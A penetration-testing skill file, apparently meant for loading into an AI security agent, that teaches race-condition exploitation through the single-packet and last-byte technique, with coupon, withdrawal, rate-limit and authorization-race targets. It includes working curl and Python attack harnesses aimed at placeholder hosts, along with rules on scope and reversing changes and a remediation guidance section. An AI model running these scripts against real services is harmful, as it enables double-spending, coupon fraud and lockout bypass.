---
name: attack-race-condition
description: "Race condition exploitation — TOCTOU, limit overrun, concurrent request windows, single-packet attacks"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - race-condition
  - toctou
  - business-logic
  - concurrency
  - attack
tech_stack:
  - web
  - api
cwe_ids:
  - CWE-362
  - CWE-367
chains_with:
  - attack-rate-limit-bypass
  - attack-idor-automation
prerequisites: []
severity_boost:
  attack-rate-limit-bypass: "Concurrency plus rate-limit gaps = unbounded brute force and enumeration"
  attack-idor-automation: "Racing an authorization check = access during the window before it completes"
---

# Race Condition Exploitation

> **AI LOAD INSTRUCTION**: The core insight is that **the check and the action are separate
> database operations**, and the window between them is the vulnerability. The classic example:
> a balance check runs, then a deduction runs — send two withdrawals in that window and both
> pass the check before either deducts.
>
> The technique that makes this reliable in HTTP/1.1 and HTTP/2 is the **single-packet attack**:
> hold all requests on the wire, release them in the same TCP packet, and eliminate network
> jitter as a variable. Sending requests in a loop and hoping is not a test — it is noise, and
> it produces both false positives and false negatives.
>
> The economic targets are what make severity: **redeeming a coupon twice, withdrawing twice,
> voting twice, claiming a username, bypassing a one-time limit.** Always establish what the
> business rule *should* be before showing that it can be broken.

## 0. RELATED ROUTING

- [race-condition](../race-condition/SKILL.md) — the long-form companion; load alongside this file
- [attack-rate-limit-bypass](../attack-rate-limit-bypass/SKILL.md) — concurrency as a limit bypass
- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) — the class this belongs to
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — HTTP/2 multiplexing for precise races
- [attack-idor-automation](../attack-idor-automation/SKILL.md) — racing an authorization check
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — proving a race reproducibly

---

## 1. FINDING RACE SURFACES

Race conditions exist wherever a **limit**, a **balance**, or a **one-time** action is
enforced by a read followed by a write.

| Surface | The business rule being broken |
|---|---|
| coupon / voucher redemption | one use per code |
| gift card balance | spend only what is available |
| wallet / credit balance | withdraw only what you have |
| withdrawal / transfer | no double-spend |
| "one per customer" promotions | one claim per account |
| voting / rating | one vote per user |
| username / email claim | uniqueness constraint |
| referral bonus | one bonus per referral |
| inventory reservation | no oversell |
| account registration | unique email |
| password reset token issuance | single valid token |
| file upload quota | quota enforcement |
| discount stacking | no repeated application |

**The reliable tell:** the endpoint performs a **read** (check) and then a **write** (act), and
the two are not atomic. If you can see the balance in a response and then perform an action
against it, a race is plausible.

**Look for these patterns in the request flow:**

| Pattern | Race candidate |
|---|---|
| `GET` balance → `POST` withdraw | classic double-spend |
| `POST` redeem → `{"remaining":"1"}` | coupon reuse |
| `POST` vote → `{"count":5}` | vote stuffing |
| `POST` claim → `{"available":true}` | uniqueness bypass |
| `POST` verify-code with a counter | verification bypass |

---

## 2. THE SINGLE-PACKET ATTACK

The technique that makes HTTP/1.1 and HTTP/2 races reliable. **Sending N requests from a
normal client staggers them by milliseconds, which is often wider than the race window.**

**HTTP/1.1 — last-byte synchronisation:**

1. Open N TCP connections.
2. Send each request **except the final byte**.
3. Wait for all connections to be ready.
4. Send all final bytes **in one TCP packet** (or as close as the OS allows).

All N requests arrive at the server within microseconds. This is the standard method and the
one Burp's "Send group in parallel (single-packet attack)" implements.

**HTTP/2 — multiplexing:** all streams are sent in a single packet natively, which makes HTTP/2
targets easier to race. Send the full request frames for N streams at once.

**Why this matters for correctness:** without synchronisation you are measuring network jitter,
not the application. A race that "sometimes works" with a loop is a race you cannot reproduce
in a report.

**Practical discipline:**

| Rule | Reason |
|---|---|
| use exactly 2 requests first | the minimal repro of a broken invariant is convincing |
| increase to 20–30 only after 2 works | confirms it scales and is not a fluke |
| repeat the exact batch 5–10 times | a race that fires once may be coincidence |
| never race against production balances | use a test account you own |
| capture the full request set | the evidence is the group, not one request |

**Two requests succeeding where one should is the finding.** You do not need twenty.

---

## 3. EXPLOITATION CLASSES

### 3.1 Limit overrun — spend the same value twice

```
POST /api/withdraw  {"amount": 100}
```

If the balance is 100 and two concurrent withdrawals of 100 both succeed, you have 200
against a 100 balance. **This is the canonical double-spend finding.**

**Verify the outcome properly:** check the resulting balance, the transaction log, and any
downstream accounting. A race that returns two `200`s but nets out correctly may be a UI
artefact, not a real loss.

### 3.2 Coupon and voucher reuse

```
POST /api/coupon/redeem  {"code": "SAVE50"}
```

Two concurrent redemptions both applying the discount. The tell is a response like
`{"status":"applied","remaining_uses":1}` — the counter is decremented after the check.

### 3.3 Rate-limit and lockout bypass

Two distinct mechanisms:

| Mechanism | Detail |
|---|---|
| counter race | N requests all read `attempts=0` before any writes `1` |
| limit window race | requests arrive at the boundary of a fixed window |

Concurrency alone does not defeat a well-implemented shared counter — it defeats a
**non-atomic** one. Test the login/OTP endpoint with a batch and compare the number of
attempts the server registered against the number you sent. A mismatch is the finding.

### 3.4 Authorization race (TOCTOU)

The authorization check and the action are separated. If the object's ownership or state can
change between them, a race can act on the wrong object:

- **Membership race:** invite → accept → remove, racing an action that requires membership.
- **Role race:** perform a privileged action while a role is being downgraded.
- **Payment race:** change the amount after validation but before capture.

**These are the highest-severity races** because they can yield unauthorized access rather than
just economic loss. They are also the hardest to demonstrate and need a precise understanding
of the state machine.

### 3.5 Registration and uniqueness races

Two concurrent registrations with the same email or username, both succeeding because neither
saw the other's write. The outcome is two accounts for one identity — which can be chained
into account takeover if password reset matches ambiguously.

**The tell is two `201 Created` responses** where the second should have been `409 Conflict`.

---

## 4. THE ARTEFACT THAT PROVES IT

A race finding must show **the invariant that was broken**, not just two responses.

**Capture all of the following:**

```bash
# Send two concurrent requests, preserving both complete exchanges
curl -s -X POST https://TARGET/api/withdraw -H "Authorization: Bearer $TOKEN" \
  -d '{"amount":100}' -o resp1.json &
curl -s -X POST https://TARGET/api/withdraw -H "Authorization: Bearer $TOKEN" \
  -d '{"amount":100}' -o resp2.json &
wait
# Then read the resulting state — this is the actual proof
curl -s https://TARGET/api/balance -H "Authorization: Bearer $TOKEN"
```

**The proof chain is: two successes → one broken invariant → the resulting state.**

Two `200` responses alone are not the finding. The finding is
`balance = -100` or `coupon used twice` or `two accounts, one email`.

**Use a real synchronised client for the final evidence.** The `&` above is illustrative; for
the report, use a tool that performs last-byte synchronisation so the result is reproducible.

---

## 5. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Double-spend / balance manipulation with real economic loss | **Critical (P1)** | both successes plus the resulting balance |
| Authorization bypass via TOCTOU | **Critical (P1)** | the unauthorized action and its effect |
| Duplicate account creation for one identity | **High (P2)** | two `201`s plus the resulting state |
| Coupon / voucher reuse beyond its limit | **High (P2)** | both redemptions plus the shared counter |
| Rate-limit or lockout bypass enabling credential attack | **High (P2)** | the attempt count vs. requests sent |
| Vote / rating stuffing | **Medium (P3)** | the inflated counter |
| Quota exceeded but no material impact | **Medium (P3)** | the over-quota state |
| Two `200`s that net out correctly | **Not a finding** | the invariant held |

---

## 6. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the number of concurrent requests sent | the technique, and it must be small |
| **all** responses from the batch, complete | the evidence is the group, not one request |
| the resulting state (balance, counter, record count) | **proves the invariant broke** |
| the number of repetitions and the hit rate | proves it is reproducible, not luck |
| the target's documented business rule | proves the outcome is wrong by their own definition |
| the account and object used, and confirmation you own them | shows the test was contained |
| the synchronisation method (single-packet, HTTP/2) | reproducibility; a loop is not evidence |
| a control: a **single** sequential request | proves one request behaves correctly |

**The state after the batch is the most important artefact.** Without it, two `200`s prove
nothing — the application may have handled the race correctly at the data layer.

**False positives to exclude:**

| Looks like a race | Actually |
|---|---|
| two `200`s but the final balance is correct | the invariant held — not a finding |
| a `429` on the second request | rate limiting worked |
| the second request returned an idempotency key conflict | idempotency worked correctly |
| the effect came from a retry, not concurrency | verify the requests overlapped |
| the "double" is a display artefact | read the authoritative state |
| a background job reconciled the state afterwards | it may still be a real but self-healing bug — report as low |
| sequential requests achieved it | that is not a race; it is missing validation, a different finding |

---

## 7. REMEDIATION REFERENCE

1. **Make the check and the write atomic** — a single `UPDATE ... WHERE balance >= 100` (compare-and-swap) rather than a read, a check, and a separate write.
2. **Use database transactions with proper isolation** — `SELECT ... FOR UPDATE` or serializable isolation for the balance and quota paths; read-committed alone does not prevent this.
3. **Add unique constraints and let the database enforce them** — a `UNIQUE` index on `(email)` or `(coupon_id, user_id)` makes the duplicate-registration race impossible regardless of application logic.
4. **Use idempotency keys for state-changing requests** — the client supplies a key, the server rejects a repeat. This turns a race into a no-op and is the standard fix for payment and redemption endpoints.
5. **Increment counters atomically in the datastore** — `UPDATE counters SET n = n - 1 WHERE n > 0` returns a row count; zero rows means the limit was hit. Never read-modify-write in application code.
6. **Lock the resource for the duration of the operation** — a distributed lock (Redis, etcd) is appropriate when the critical section spans services, with a bounded TTL to avoid deadlock.
7. **Avoid TOCTOU on authorization** — resolve and authorize in the same transaction as the action, or re-verify the object's state immediately before committing.
8. **Test for concurrency in CI** — a suite that fires two concurrent requests against the payment, redemption, and registration endpoints and asserts the invariant holds catches regressions that sequential tests never will.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the **effect happen twice** (or more) from one logical operation? | the race, not the latency |
| 2 | Was there a **control** - the same two operations run sequentially, which produced one effect? | the concurrency caused it |
| 3 | Did you read the **state afterwards** and count the effects? | the impact, quantified |
| 4 | Was the race **within a single operation's limit** or **across the limit**? | which control failed |
| 5 | Did the effect reach **money, inventory, a coupon, or a permission**? | the severity |
| 6 | Did you keep the batch **small enough** to avoid a DoS? | engagement integrity |
| 7 | Did you **reverse or report** every state change you caused? | engagement integrity |

**The duplicated effect, counted after the batch, with the sequential control, is the bar.** A slow
response or a latency difference is not a race.

---

## 9. EXECUTION PRIMITIVES

Race conditions are proven by **a duplicated effect from concurrent requests, with a sequential control
that produced one effect, and the state read afterwards**. Every block ends at a counted effect.

### 9.1 The sequential control, which must come first

```bash
T="https://target.example"; TOK="Bearer TOKEN_A"
# CONTROL: the two operations, SEQUENTIALLY. This establishes what "one effect" looks like.
echo "--- control: sequential ---"
curl -sS -X POST "$T/api/coupon/redeem" -H "Authorization: $TOK" -H 'Content-Type: application/json' \
  -d '{"code":"SAVE10"}' -w '\nredeem1 %{http_code}\n'
curl -sS -X POST "$T/api/coupon/redeem" -H "Authorization: $TOK" -H 'Content-Type: application/json' \
  -d '{"code":"SAVE10"}' -w '\nredeem2 %{http_code}\n'
# THE STATE READ: the balance, the order count, the coupon status - the number you will compare
curl -sS "$T/api/wallet" -H "Authorization: $TOK" | head -c 200; echo
curl -sS "$T/api/coupon/SAVE10" -H "Authorization: $TOK" | head -c 200; echo
echo "-> record these numbers. The sequential run MUST produce exactly one effect; if it produces two,"
echo "   the defect is not a race and the report must say so."
```

**The sequential control can invalidate the whole hypothesis.** If two sequential operations already
double the effect, the finding is missing idempotency, not a race - and that is a different report.

### 9.2 The single-packet attack, which is the modern primitive

```python
# the single-packet attack: many requests in ONE TCP segment, so the server processes them
# within the same scheduling window. This is the reliable form of a race test.
import socket, ssl, time
T, P = "target.example", 443
REQ = (b"POST /api/coupon/redeem HTTP/1.1\r\nHost: target.example\r\n"
       b"Authorization: Bearer TOKEN_A\r\nContent-Type: application/json\r\n"
       b"Content-Length: 20\r\nConnection: keep-alive\r\n\r\n{\"code\":\"SAVE10\"}\r\n")

def single_packet(n=20):
    ctx = ssl.create_default_context()
    # warm one connection so the handshake cost is out of the timing
    warm = ctx.wrap_socket(socket.create_connection((T, P), timeout=10), server_hostname=T)
    warm.sendall(REQ); time.sleep(0.2)
    try: warm.recv(65535)
    except Exception: pass
    warm.close()
    # open N connections, send only the LAST byte of each request, then flush all at once
    socks = []
    for _ in range(n):
        s = ctx.wrap_socket(socket.create_connection((T, P), timeout=10), server_hostname=T)
        s.sendall(REQ[:-1])          # everything except the final byte
        socks.append(s)
    t0 = time.perf_counter()
    for s in socks: s.sendall(REQ[-1:])   # release them together
    out = []
    for s in socks:
        s.settimeout(8); data = b""
        try:
            while True:
                c = s.recv(65535)
                if not c: break
                data += c
        except Exception: pass
        out.append(data.decode(errors="replace")); s.close()
    return time.perf_counter() - t0, out

dt, outs = single_packet(20)
codes = [o.split()[1] if o.split() else "?" for o in outs]
print("elapsed %.3fs  responses: %s" % (dt, {c: codes.count(c) for c in set(codes)}))
print("200s:", codes.count("200"), " -> the number of SUCCESSFUL redemptions is the effect count")
print()
print("CONTROL COMPARISON: the sequential run produced ONE 200.")
print("If this batch produced more than one, the limit is bypassable by concurrency.")
print()
print("AFTERWARDS: read the wallet and the coupon state and record the actual effect count.")
```

**The single-packet form is what makes the test reliable.** A `ThreadPoolExecutor` burst has enough
scheduling jitter to miss the window, and the last-byte trick is the standard improvement.

### 9.3 The library-based burst, as a first pass

```python
# a first pass with a thread pool - cheaper to write, less reliable, and useful as a screen
import requests, concurrent.futures as cf, time
T = "https://target.example"; H = {"Authorization": "Bearer TOKEN_A"}
BODY = {"code": "SAVE10"}

def one(_):
    t0 = time.perf_counter()
    try:
        r = requests.post(f"{T}/api/coupon/redeem", json=BODY, headers=H, timeout=15)
        return r.status_code, r.text[:80], time.perf_counter() - t0
    except Exception as e:
        return "ERR", type(e).__name__, time.perf_counter() - t0

N = 20
with cf.ThreadPoolExecutor(max_workers=N) as ex:
    res = list(ex.map(one, range(N)))
codes = [r[0] for r in res]
from collections import Counter
print("status distribution:", dict(Counter(codes)))
print("successes:", sum(1 for c in codes if c == 200))
print()
print("THE CONTROL: run the same body SEQUENTIALLY and print its success count beside this one.")
for _ in range(2):
    print("  sequential:", one(0)[0])
print()
print("A screen that shows more concurrent successes than sequential successes is worth re-testing")
print("with the single-packet form. A screen that shows the same count is not evidence of a race.")
```

**A thread-pool screen is a screen, not proof.** The report should say which form produced the effect.

### 9.4 The classic race targets

```python
# the operations where a race has the highest impact, and the state read for each
TARGETS = {
 "coupon redemption":  ("POST /api/coupon/redeem",       "GET /api/wallet, GET /api/coupon/{code}"),
 "wallet transfer":    ("POST /api/transfer",            "GET /api/wallet, GET /api/transactions"),
 "withdrawal":         ("POST /api/withdraw",            "GET /api/balance"),
 "vote":               ("POST /api/poll/{id}/vote",      "GET /api/poll/{id}"),
 "like/follow":        ("POST /api/posts/{id}/like",     "GET /api/posts/{id}"),
 "invite acceptance":  ("POST /api/invite/accept",       "GET /api/team/members"),
 "referral credit":    ("POST /api/referral/claim",      "GET /api/wallet"),
 "seat/license claim": ("POST /api/license/claim",       "GET /api/license"),
 "trial extension":    ("POST /api/trial/extend",        "GET /api/subscription"),
 "file write":         ("PUT /api/files/{name}",         "GET /api/files/{name}"),
 "rate-limit counter": ("POST /api/login",               "X-RateLimit-Remaining header"),
 "OTP validation":     ("POST /api/otp/verify",          "GET /api/session"),
}
print("%-22s %-34s %s" % ("target", "operation", "state read (the effect count)"))
for name, (op, state) in TARGETS.items():
    print("%-22s %-34s %s" % (name, op, state))
print()
print("ALSO: file-write races, where two concurrent writes to the same path produce a corrupted or")
print("duplicated file, and the classic TOCTOU between a check and a use. Both are read the same way:")
print("run the batch, then READ the resulting state and count.")
print()
print("SEQUENTIAL CONTROL for every row: the same two operations in order. Record both counts.")
```

**The state read is the measurement.** Every target needs its own state read, and the count is the finding.

### 9.5 Limits, and staying inside them

```python
# rules for a non-destructive race test
RULES = [
 "use your OWN account and a disposable object (a coupon you issued, a transfer between your own accounts)",
 "cap the batch: 20-50 concurrent requests, never thousands - a large batch is a DoS, not a race test",
 "run the control FIRST, so you know what one effect looks like before you cause more than one",
 "read the state immediately after, record the effect count, then REVERSE what you can",
 "do not race a destructive operation (delete, refund, payout) without written authorisation",
 "record the exact timestamp and the batch size, so the effect count is auditable",
 "stop at the first confirmed duplication; a repeat is not needed and adds risk",
]
for r in RULES: print(" -", r)
print()
print("WHAT TO REVERSE and how:")
for row in [("coupon redeemed twice", "ask the operator to remove the extra credit, or note it in the report"),
            ("wallet credited twice", "return the surplus in a second transfer and record both"),
            ("duplicate order created", "cancel the duplicate and record the cancellation id"),
            ("extra vote or like",     "remove it and record the removal"),
            ("rate-limit counter",     "no state to reverse; note the counter and the window")]:
    print("  %-24s %s" % row)
```

**A small batch and a reversal.** The engagement rule is what separates a race test from an incident, and
the reversal is part of the evidence.

### 9.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests, concurrent.futures as cf, time
from collections import Counter
T = "https://target.example"; H = {"Authorization": "Bearer TOKEN_A"}
OP = ("POST", f"{T}/api/coupon/redeem", {"code": "SAVE10"})
STATE = (f"{T}/api/wallet", H)

def call():
    m, url, body = OP
    try:
        r = requests.request(m, url, json=body, headers=H, timeout=15)
        return r.status_code
    except Exception as e:
        return f"ERR:{type(e).__name__}"

def state():
    try:
        r = requests.get(STATE[0], headers=STATE[1], timeout=10)
        return r.status_code, r.text[:100].replace("\n", " ")
    except Exception as e:
        return "ERR", type(e).__name__

print("=== CONTROL: sequential ===")
print("  before:", state())
print("  seq1  :", call(), " seq2:", call())
print("  after :", state(), "  <-- the ONE-effect baseline")
print()
print("=== TEST: concurrent batch of 20 ===")
t0 = time.perf_counter()
with cf.ThreadPoolExecutor(max_workers=20) as ex:
    codes = list(ex.map(lambda _: call(), range(20)))
dt = time.perf_counter() - t0
print("  distribution:", dict(Counter(codes)), " elapsed %.2fs" % dt)
print("  successes:", sum(1 for c in codes if c == 200))
print("  after:", state(), "  <-- the effect count")
print()
print("FINDING = the concurrent success count exceeds the sequential count AND the state read")
print("          shows the corresponding number of effects.")
print("REPORT  = batch size, the two counts, the state read, and the reversal.")
PY
```

**Two counts and the state read.** The sequential count is the baseline and the state read is the
measurement; a status distribution alone is not an effect.

---

## 10. EVIDENCE STANDARD — RACE ARTEFACTS

| Item | Why |
|---|---|
| The **sequential control's effect count** | what one logical operation produces |
| The **concurrent batch size** | the scale of the test and its risk |
| The **concurrent effect count** | the finding |
| The **state read** before and after, with the numbers | quantifies the impact |
| The **method used** (single-packet, last-byte, thread pool) | determines the claim's strength |
| The **state that was relied upon and the window** (a check, a counter, a balance) | names the control that failed |
| The **impact**: money, inventory, an entitlement, a permission | the severity |
| The **reversal performed**, or the note that the operator must act | engagement integrity |
| The **timing**, and the response distribution | reproducibility |
| Confirmation that **the batch was bounded and non-destructive** | engagement integrity |

Report the **two counts and the state**: "redeeming `SAVE10` twice sequentially credits the wallet once
and the second attempt returns `409`, which is the {control} baseline. A batch of 20 requests released
with the last-byte technique produced 14 `200` responses and 6 `409`s in a single scheduling window, and
a `GET /api/wallet` immediately afterwards showed a credit of 14 times the coupon value, where the
sequential run showed one. The state read is the measurement; the response distribution alone is not. The
surplus was returned in a single transfer, `txn_8812`, and the coupon was expired by the operator at my
request", never "the endpoint is vulnerable to a race condition".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A **slow response** or a latency difference | not a race; no effect was duplicated |
| Two **sequential** requests producing two effects | missing idempotency, not a race - a different finding |
| A status distribution with **repeated `200`s but no state change** | the effect did not happen |
| A batch that produced **the same count** as the sequential control | the limit held |
| A race against **your own test service** | tests your environment |
| An **untested window** with no timing evidence | an untested hypothesis |
| A race that required **a batch large enough to degrade the service** | a DoS you caused |
| A **duplicate e-mail or notification** with no state or financial effect | cosmetic; note it as low severity |
| A race observed **once**, unexplained, and not reproduced | an untested hypothesis |
| A race on an operation **outside the engagement's scope** | out of scope |
| A finding where **the effect was not reversed and the operator was not told** | an incident you caused |

**Two counts, a state read, and a sequential control.** Slow responses and non-idempotent endpoints are the
two ways this family produces non-findings.

---

## 11. REMEDIATION REFERENCE — CONCURRENCY CONTROL HARDENING

1. **Take a database-level lock or use an atomic compare-and-set for every state transition that must happen once** - `UPDATE ... WHERE status = 'available'` with a row count check removes most of this class.
2. **Use a unique constraint or a uniqueness-checked insert as the final arbiter for one-per-user operations** - the database's own guarantee is the only reliable one under concurrency.
3. **Do not implement the check as a read followed by a write in application code; the gap between the read and the write is the race** - the TOCTOU pattern is the defect.
4. **Apply idempotency keys to every state-changing operation, and deduplicate on the key server-side** - it makes a duplicate request harmless rather than harmful.
5. **Serialize operations on the same resource with a per-resource mutex, a queue, or a single-writer design** - it removes the concurrency rather than detecting it.
6. **Wrap the whole operation in the correct transaction isolation level, and verify that the level actually prevents the anomaly you are relying on** - `READ COMMITTED` does not prevent a lost update in every case.
7. **Do not rely on a distributed cache's `INCR` alone for a limit; combine it with an atomic check-and-set** - the read-then-write form is the bypass in 10.5.
8. **Make the effect reversible or compensating where it cannot be made atomic, and reconcile asynchronously** - the financial and inventory cases need a reconciliation job.
9. **Log every state transition with a request identifier and a timestamp, and alert on two transitions for the same logical operation** - the duplicate is detectable after the fact.
10. **Apply the limit after the resource is claimed rather than before it is checked, and re-check at the commit point** - it narrows the window to the transaction itself.
11. **Load-test each state-changing endpoint with the last-byte technique as part of the release process, and assert that the effect count matches the sequential baseline** - the regression is invisible without a concurrency test.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [race-condition](../race-condition/SKILL.md) - the full technique reference
- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) - the flow context every race finding needs
- [attack-rate-limit-bypass](../attack-rate-limit-bypass/SKILL.md) - the sibling concurrency family, with the same sequential control
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the authorization checks a race can step over
- [web-cache-deception](../web-cache-deception/SKILL.md) - the caching layer a race can desynchronise
